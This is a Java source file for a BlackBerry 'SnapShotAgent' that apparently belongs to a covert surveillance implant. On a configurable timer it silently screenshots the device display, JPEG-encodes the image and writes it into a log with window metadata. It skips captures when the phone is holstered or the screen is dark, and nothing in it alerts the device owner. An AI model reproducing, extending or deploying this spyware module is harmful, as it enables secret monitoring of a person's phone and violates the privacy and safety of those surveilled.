package blackberry.agent;

import java.io.EOFException;

import net.rim.device.api.system.Backlight;
import net.rim.device.api.system.Bitmap;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.Display;
import net.rim.device.api.system.EncodedImage;
import net.rim.device.api.system.JPEGEncodedImage;
import net.rim.device.api.util.DataBuffer;
import blackberry.log.Log;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.WChar;

/**
 * TODO : evitare lo snapshot se l'immagine e' nera.
 * Cominciare a vedere se e' in holster.
 * @author user1
 *
 */
public class SnapShotAgent extends Agent {
	 //#debug
    static Debug debug = new Debug("SnapShotAgent", DebugLevel.NOTIFY);
    
    private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 50;
    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
	private static final int MIN_TIMER = 30 * 1000;
   
    private int timerMillis = 60 * 1000;
    private boolean onNewWindow = false;

    public SnapShotAgent(final boolean agentStatus) {
        super(Agent.AGENT_SNAPSHOT, agentStatus, true, "SnapShotAgent");
        // #ifdef DBC
        Check.asserts(Log.convertTypeLog(this.agentId) == LogType.SNAPSHOT,
                "Wrong Conversion");
        // #endif       
    }

    protected SnapShotAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    // se e' in standby non prendi la snapshot
    public void actualRun() {

        // #debug
        debug.info("Taking snapshot");
        
        
        if(DeviceInfo.isInHolster())
        {
        	// #debug
        	debug.info("In Holster, skipping snapshot");
        	return;
        }
        
        if(!Backlight.isEnabled() )
        {
        	// #debug
        	debug.info("No backlight, skipping snapshot");
        	return;
        }
        
        final int width = Display.getWidth();
        final int height = Display.getHeight();

        final Bitmap bitmap = new Bitmap(width, height);
        Display.screenshot(bitmap);

        // int size = width * height;
        /*
         * int[] argbData = new int[size]; bitmap.getARGB(argbData, 0, width, 0,
         * 0, width, height);
         */
        // EncodedImage encoded = PNGEncodedImage.encode(bitmap);
        final EncodedImage encoded = JPEGEncodedImage.encode(bitmap,
                SNAPSHOT_DEFAULT_JPEG_QUALITY);
        final byte[] plain = encoded.getData();

        /*
         * AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "snapshot.jpg",
         * false); if (file.exists()) { file.delete(); } file.create();
         * file.write(plain);
         */

        // #ifdef DBC
        Check.requires(log != null, "Null log");
        // #endif

        log.createLog(getAdditionalData());
        log.writeLog(plain);
        log.close();

        // #debug
        debug.trace("finished run");

    }

    private byte[] getAdditionalData() {
        final String window = "Desktop";

        final int wlen = window.length() * 2;
        final int tlen = wlen + 24;
        final byte[] additionalData = new byte[tlen];

        final DataBuffer databuffer = new DataBuffer(additionalData, 0, tlen,
                false);

        databuffer.writeInt(LOG_SNAPSHOT_VERSION); // version
        databuffer.writeInt(0); // process name len
        databuffer.writeInt(wlen); // windows name len

        byte[] windowsName = new byte[wlen];
        windowsName = WChar.getBytes(window);
        databuffer.write(windowsName);

        // #ifdef DBC
        Check.asserts(windowsName.length == wlen, "Wrong windows name");
        Check.ensures(additionalData.length == tlen,
                "Wrong additional data name");
        // #endif

        // #debug
        debug.trace("Additional data len: " + additionalData.length);

        return additionalData;
    }

    protected boolean parse(final byte[] confParameters) {
        // #ifdef DBC
        Check.asserts(confParameters != null, "Null confParameters");
        // #endif

        final DataBuffer databuffer = new DataBuffer(confParameters, 0,
                confParameters.length, false);

        try {

            int value = databuffer.readInt();

            if (value >= MIN_TIMER) {
                this.timerMillis = value;
            }
            // #debug
            debug.trace("timer: " + timerMillis);

            value = databuffer.readInt();
            onNewWindow = (value == 1);
            // #debug
            debug.trace("onNewWindow: " + onNewWindow);

        } catch (final EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        setPeriod(timerMillis);
        setDelay(timerMillis);

        return true;
    }

}
